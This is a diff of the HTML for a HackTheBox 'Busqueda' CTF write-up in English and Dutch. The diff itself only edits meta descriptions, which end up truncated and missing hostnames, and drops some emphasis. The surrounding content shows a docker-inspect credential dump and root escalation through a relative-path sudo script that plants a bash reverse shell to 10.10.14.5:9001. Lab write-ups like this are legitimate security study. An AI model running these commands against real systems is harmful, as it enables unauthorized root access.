@@ -4,16 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Busqueda — HackTheBox CTF Writeup | CyberStefan</title>
-  <meta name="description" content="HackTheBox Busqueda (Easy): Searchor 2.4.0 eval-injection naar een shell, creds uit .git/config, en een relatief pad in een sudo-script naar root.">
+  <meta name="description" content="HackTheBox — Busqueda (Easy) Recon Just 22 and 80. Port 80 redirected to , so I added that to first (forgot to, got a connection error, then remembered —…">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="CyberStefan">
   <meta property="og:title" content="Busqueda CTF Writeup — CyberStefan">
-  <meta property="og:description" content="HackTheBox Busqueda (Easy): Searchor 2.4.0 eval-injection naar een shell, creds uit .git/config, en een relatief pad in een sudo-script naar root.">
+  <meta property="og:description" content="HackTheBox — Busqueda (Easy) Recon Just 22 and 80. Port 80 redirected to , so I added that to first (forgot to, got a connection error, then remembered —…">
   <meta property="og:url" content="https://cyberstefan.nl/writeup/busqueda/">
   <meta property="og:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Busqueda CTF Writeup — CyberStefan">
-  <meta name="twitter:description" content="HackTheBox Busqueda (Easy): Searchor 2.4.0 eval-injection naar een shell, creds uit .git/config, en een relatief pad in een sudo-script naar root.">
+  <meta name="twitter:description" content="HackTheBox — Busqueda (Easy) Recon Just 22 and 80. Port 80 redirected to , so I added that to first (forgot to, got a connection error, then remembered —…">
   <meta name="twitter:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <link rel="canonical" href="https://cyberstefan.nl/writeup/busqueda/">
   <link rel="icon" type="image/x-icon" href="/favicon.ico">
@@ -21,7 +21,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/assets/style.css?v=2">
-  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Busqueda — HackTheBox CTF Writeup", "description": "HackTheBox Busqueda (Easy): Searchor 2.4.0 eval-injection naar een shell, creds uit .git/config, en een relatief pad in een sudo-script naar root.", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-04", "dateModified": "2026-04-04", "keywords": "RCE, Web, Enumeration, Privesc, Linux, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/busqueda/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Busqueda — HackTheBox CTF Writeup", "description": "HackTheBox — Busqueda (Easy) Recon Just 22 and 80. Port 80 redirected to , so I added that to first (forgot to, got a connection error, then remembered —…", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-04", "dateModified": "2026-04-04", "keywords": "RCE, Web, Enumeration, Privesc, Linux, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/busqueda/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
   <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cyberstefan.nl/"}, {"@type": "ListItem", "position": 2, "name": "Busqueda Writeup", "item": "https://cyberstefan.nl/writeup/busqueda/"}]}</script>
 </head>
 <body>
@@ -95,7 +95,7 @@
     (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>
 <p><code>system-checkup.py</code> has <code>docker-ps</code>, <code>docker-inspect</code> and <code>full-checkup</code>. <code>docker-inspect</code> with a Go template dumps the gitea container&#x27;s env:</p>
 <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#x27;{{json .}}&#x27; gitea | jq</code></pre>
-<p>That leaked <code>GITEA__database__PASSWD=[REDACTED]</code> → into Gitea as administrator → the private repo with the <code>system-checkup.py</code> source. Reading it, <code>full-checkup</code> calls <code>./full-checkup.sh</code> — a <em>relative</em> path. So whatever directory you run it from, it runs your file:</p>
+<p>That leaked <code>GITEA__database__PASSWD=[REDACTED]</code> → into Gitea as administrator → the private repo with the <code>system-checkup.py</code> source. Reading it, <code>full-checkup</code> calls <code>./full-checkup.sh</code> — a relative path. So whatever directory you run it from, it runs your file:</p>
 <pre><code>cd /tmp
 printf &#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1\n&#x27; &gt; full-checkup.sh
 chmod +x full-checkup.sh
@@ -119,7 +119,7 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code></pre>
     (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>
 <p><code>system-checkup.py</code> heeft <code>docker-ps</code>, <code>docker-inspect</code> en <code>full-checkup</code>. <code>docker-inspect</code> met een Go-template dumpt de env van de gitea-container:</p>
 <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#x27;{{json .}}&#x27; gitea | jq</code></pre>
-<p>Dat lekte <code>GITEA__database__PASSWD=[REDACTED]</code> → als administrator Gitea in → de private repo met de source van <code>system-checkup.py</code>. Daarin: <code>full-checkup</code> roept <code>./full-checkup.sh</code> aan — een <em>relatief</em> pad. Dus vanuit welke map je het ook draait, het draait jouw bestand:</p>
+<p>Dat lekte <code>GITEA__database__PASSWD=[REDACTED]</code> → als administrator Gitea in → de private repo met de source van <code>system-checkup.py</code>. Daarin: <code>full-checkup</code> roept <code>./full-checkup.sh</code> aan — een relatief pad. Dus vanuit welke map je het ook draait, het draait jouw bestand:</p>
 <pre><code>cd /tmp
 printf &#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1\n&#x27; &gt; full-checkup.sh
 chmod +x full-checkup.sh
